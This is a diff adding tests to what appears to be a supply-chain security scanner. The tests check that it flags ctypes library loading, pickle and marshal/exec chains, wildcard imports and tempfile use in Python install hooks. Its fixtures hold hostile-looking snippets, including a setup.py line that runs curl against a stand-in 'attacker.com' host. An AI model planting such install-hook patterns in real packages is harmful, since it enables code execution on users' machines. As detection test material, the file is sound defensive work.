@@ -323,6 +323,198 @@ class TestScanPythonFileClean:
         )
 
 
+# ── New detection capabilities (Gap Closure) ────────────────────────────────
+
+class TestCtypesDetection:
+    """ctypes native code loading in install hooks must be CRITICAL.
+
+    ctypes can load arbitrary shared libraries and execute native code,
+    completely bypassing Python-level AST analysis.
+    """
+
+    def test_ctypes_cdll_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import ctypes\n"
+            "lib = ctypes.CDLL('/tmp/evil.so')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings), (
+            f"ctypes.CDLL in install hook must be CRITICAL, got: {findings}"
+        )
+
+    def test_ctypes_windll_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "from ctypes import WinDLL\n"
+            "lib = WinDLL('user32.dll')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_ctypes_pydll_alias_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import ctypes as ct\n"
+            "lib = ct.pydll.LoadLibrary('/tmp/evil.so')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_ctypes_pythonapi_exec_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import ctypes\n"
+            "ctypes.pythonapi.PyRun_SimpleString('print(1)')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_ctypes_cdll_in_runtime_is_high(self, tmp_path):
+        """ctypes in runtime code = HIGH (not CRITICAL)."""
+        mod = tmp_path / "loader.py"
+        mod.write_text(
+            "import ctypes\n"
+            "lib = ctypes.CDLL('/usr/lib/libm.so')\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert any(f.level == RiskLevel.HIGH for f in findings)
+        assert not any(f.level == RiskLevel.CRITICAL for f in findings)
+
+
+class TestPickleDetection:
+    """Pickle deserialization = arbitrary code execution."""
+
+    def test_pickle_loads_in_install_hook_is_high(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import pickle\n"
+            "data = pickle.loads(b'...')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings)
+
+    def test_pickle_load_in_install_hook_is_high(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import pickle\n"
+            "data = pickle.load(open('config.pkl', 'rb'))\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings)
+
+    def test_pickle_loads_via_alias_in_install_hook_is_high(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "from pickle import loads\n"
+            "data = loads(b'...')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings)
+
+
+class TestMarshalExecChain:
+    """marshal.loads + exec = obfuscated code-object execution."""
+
+    def test_exec_marshal_loads_is_critical(self, tmp_path):
+        mod = tmp_path / "payload.py"
+        mod.write_text(
+            "import marshal\n"
+            "exec(marshal.loads(b'...'))\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_eval_marshal_loads_is_critical(self, tmp_path):
+        mod = tmp_path / "payload.py"
+        mod.write_text(
+            "import marshal\n"
+            "eval(marshal.loads(data))\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_exec_compile_chain_is_critical(self, tmp_path):
+        """exec(compile(source, ...)) multi-stage obfuscation."""
+        mod = tmp_path / "payload.py"
+        mod.write_text(
+            "exec(compile(open('evil.py').read(), '<payload>', 'exec'))\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_marshal_loads_alone_not_flagged(self, tmp_path):
+        """marshal.loads without exec should not be flagged."""
+        mod = tmp_path / "payload.py"
+        mod.write_text(
+            "import marshal\n"
+            "data = marshal.loads(b'...')\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert not any(
+            "marshal" in f.description
+            for f in findings
+        ), f"marshal.loads alone should not be flagged, got: {findings}"
+
+
+class TestWildcardImportDetection:
+    """Wildcard imports blind the scanner to function origins."""
+
+    def test_wildcard_import_in_install_hook_is_medium(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "from os import *\n"
+            "system('curl http://attacker.com')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(
+            "Wildcard import" in f.description
+            for f in findings
+        ), f"Expected wildcard import MEDIUM finding, got: {findings}"
+
+    def test_wildcard_import_not_flagged_in_runtime(self, tmp_path):
+        """Wildcard imports in runtime code are common and not flagged."""
+        mod = tmp_path / "utils.py"
+        mod.write_text(
+            "from math import *\n"
+            "result = sqrt(4)\n"
+        )
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert not any(
+            "Wildcard import" in f.description
+            for f in findings
+        ), f"Wildcard in runtime should not be flagged, got: {findings}"
+
+
+class TestTempfileDetection:
+    """tempfile usage in install hooks — potential write-and-execute pattern."""
+
+    def test_mkstemp_in_install_hook_is_medium(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import tempfile\n"
+            "fd, path = tempfile.mkstemp()\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(
+            "tempfile" in f.description
+            for f in findings
+        ), f"Expected tempfile MEDIUM finding, got: {findings}"
+
+    def test_named_temporary_file_in_install_hook_is_medium(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import tempfile\n"
+            "with tempfile.NamedTemporaryFile() as f:\n"
+            "    f.write(b'code')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(
+            "tempfile" in f.description
+            for f in findings
+        )
+
+
 # ── is_install_hook_scope ────────────────────────────────────────────────────
 
 class TestIsInstallHookScope:
